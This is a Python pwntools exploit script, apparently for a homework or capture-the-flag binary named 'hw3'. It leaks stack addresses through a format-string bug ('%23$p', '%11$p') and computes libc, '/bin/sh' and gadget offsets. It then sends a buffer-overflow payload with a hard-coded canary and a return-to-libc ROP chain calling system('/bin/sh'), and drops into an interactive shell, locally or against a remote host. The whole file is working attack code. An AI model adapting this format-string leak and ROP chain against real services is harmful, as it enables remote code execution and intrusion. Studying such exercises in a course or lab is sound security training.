#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], gdbscript=gdbscript, aslr=True)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath])


binPath="./hw3"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *order+80
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="info"
io = start()

#Leaking values from the stack
io.sendline("2")
io.recvuntil("Enter your order number>\n")
io.sendline("%23$p")
binsh_addr=io.recvline()
libc_addr=binsh_addr

io.sendline("2")
io.recvuntil("Enter your order number>\n")
io.sendline("%11$p")
rdi_addr=io.recvline()


binsh_addr_str=binsh_addr.strip().decode("utf-8")
libc_addr_str=libc_addr.strip().decode("utf-8")
rdi_addr_str=rdi_addr.strip().decode("utf-8")

#stripping the You entered> value from the string
binsh_addr_str=binsh_addr_str[13:]
libc_addr_str=libc_addr_str[13:]
rdi_addr_str=rdi_addr_str[13:]

#Converting to Hex values to Integers
binsh_addr_int=int( binsh_addr_str, 16)
libc_addr_int=int( libc_addr_str, 16)
rdi_addr_int= int( rdi_addr_str, 16)


#Calculating the offsets
binsh_final=binsh_addr_int+int(1511557)
libc_final=libc_addr_int +int (139363)
rdi_final=rdi_addr_int+ int(91)


io.sendline("1")
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

#Values with the ASLR OFF
#libCSystem = pwn.p64(0x7ffff7e1d860)
#popRDI = pwn.p64(0x000055555555546b)
#binSH = pwn.p64(0x7ffff7f6c882)

#define payload
overFlow = b'A'*72
nops=b'\x90' * 8
#placing the stackSmasher value in the payload
canary=pwn.p64(0xf007ba11f007ba11)
libCSystem = pwn.p64(libc_final)
popRDI = pwn.p64(rdi_final)
binSH = pwn.p64(binsh_final)

payload = pwn.flat(
        [
            overFlow,
            canary,
            nops,
            popRDI,
            binSH,
            libCSystem
           ]
        )
pwn.info("Payload length: %d",len(payload))

io.sendline(payload)
io.interactive()

